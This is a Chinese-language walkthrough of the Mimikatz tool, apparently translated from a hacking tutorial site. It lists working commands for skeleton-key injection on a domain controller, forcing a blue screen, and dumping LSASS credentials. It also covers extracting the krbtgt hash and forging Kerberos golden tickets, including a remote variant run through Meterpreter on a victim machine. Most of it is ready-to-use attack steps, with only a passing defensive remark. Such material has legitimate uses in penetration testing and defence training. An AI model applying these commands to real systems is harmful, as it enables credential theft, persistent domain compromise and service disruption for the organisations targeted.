## Mimikatz指南

### **什么是Mimikatz？** [^1]

### **用Mimikatz生成Skeleton Key** [^2]

1. 首先，我将尝试使用mimikatz作为密码登录我的服务器。
2. 可以清楚地看到我们无法使用“mimikatz”作为密码登录服务器
3. 现在我将使用其密码“T00r”登录服务器
4. 正如您在下面看到的，我使用正确的密码登录了服务器
5. 如果您曾登录过服务器或已解锁服务器，则可以使用Mimikatz创建一个存储在服务器内存中的框架密钥
6. 首先，我们将使用Mimikatz获得调试权限 `privilege::debug`
7. 然后我们将使用mimikatz框架密钥注入服务器的==内存==中  `misc::skeleton`
8. 有了这个，我们就可以在服务器上成功注入我们的万能钥匙
9. **注意：**您必须使用Administrative Privilege打开mimikatz才能创建Skeleton Key。
10. 现在我将尝试使用我们刚刚在内存中注入的骨架键“mimikatz”登录服务器。记得上次我们尝试使用mimikatz作为密码登录服务器时，我们没有成功。
11. 但这次'mimikatz'被接受为密码。这并不意味着我们重置了原始密码'T00r'。服务器将继续使用'T00r'登录，但现在它也将接受'mimikatz'作为密码。
12. 我们在内存中注入了框架密钥，而不是在存储器中，因此下次管理员重新启动服务器时，我们将失去访问权限。因此，保护域控制器免受Skeleton Key保护的最佳方法是经常重启服务器或阻止mimikatz访问内存。

### **使用Mimikatz让主机蓝屏死机（BSOD）**

1. 使用**管理员**运行mimikatz
2. 启动mimidrv服务  `!+`
3. 现在按以下命令启动BSOD `!bsod`
4. **注意：**此攻击可能会破坏数据并**可能损害系统**。小心使用!!

### **显示主机名**

`hostname`

### 使用Mimikatz生成Golden Ticket  [^3]

1. 要获取域，我们将从命令行或PowerShell 运行  `ipconfig  /all` 。取Primary Dns Suffix值
2. 现在要获得SID，我们将使用 `whoami / user` 命令
3. 现在我们使用mimikatz自己提取生成Ticket所需的NTLM哈希。
4. `privilege::debug`
5. `sekurlsa::logonpasswords`
6. 生成票证 [^4]
7. `kerberos::golden /domain:PAVAN.LOCAL /sid:S-1-5-21-1118594253-693012904-2765600535 /rc4:9a7a6f22651d6a0fcc6e6a0c723c9cb0 /user:hacker /id:500 /ptt`
8. 这里正在为名为“ **hacker** ” 的用户创建Golden Ticket; 使用`[/ ppt]`选项在当前会话中传递票证
9. 现在运行命令提示符以访问共享文件夹并执行以下命令
10. `pushd \\WINSERVER01\c$`
11. 现在我们在Z：驱动程序执行以下命令用于NT目录服务
12. `cd WINDOWS\NTDS & DIR`
13. 正如您所看到的那样，我们可以访问共享文件夹，如果没有Admin Access就无法访问该文件夹，但我们已经获得了它而不使用CMD作为管理员

### **远程生成Golden Ticket**

1. 首先获取服务器的Meterpreter访问权限
2. 获得meterpreter后，使用该命令将mimikatz文件夹上传到受害者系统
3. `upload -r /root/Desktop/mimi c:\` **使用-r**以便递归地上载upload命令
4. 打开shell并使用 `ipconfig / all`  解析Domain
5. `whoami / user` 获取SID
6. 运行 **mimikatz.exe**
7. 现在使用以下命令提取**krbtgt NTLM哈希**
8. `lsadump::lsa /inject /name:krbtgt` 取**ntlm**值
9. 生成Golden Ticket
10. `kerberos::golden /domain:pavan.loc /sid:S-1-5-21-97841242-3460736137-492355079 /rc4:e847d2e54044172830e3e3a6b8438853 /user:Hacker /id:500 /ptt`

### 本地破解进程镜像 lsass

```
mimikatz # sekurlsa::minidump lsass.dump
mimikatz # sekurlsa::logonpasswords
```



### **破解扫雷游戏**

`minesweeper::infos`

[原文](https://www.hackingarticles.in/understanding-guide-mimikatz/)

---

[^1]: Mimikatz是[Benjamin Delpy](https://twitter.com/gentilkiwi?lang=en)用C语言制作的工具。它是从内存中提取纯文本密码，哈希值和Kerberos票证的绝佳工具。它也可以用于生成Golden Ticket。[项目地址](https://github.com/gentilkiwi/mimikatz)
[^2]: 在这次攻击中，mimikatz在域控制器上安装补丁以接受“mimikatz”作为新的登录密码？它可以被视为**主密钥**，它将向攻击者打开Active Directory。可以如下所示执行此攻击。
[^3]: 要生成金票，我们需要以下信息：**域、SID、NTLM哈希**
[^4]: **语法：** `Kerberos :: golden / domain：[Domain] / sid：[SID] / rc4：[NTLM Hash] / user：[Username To Create] / id：500 / ptt`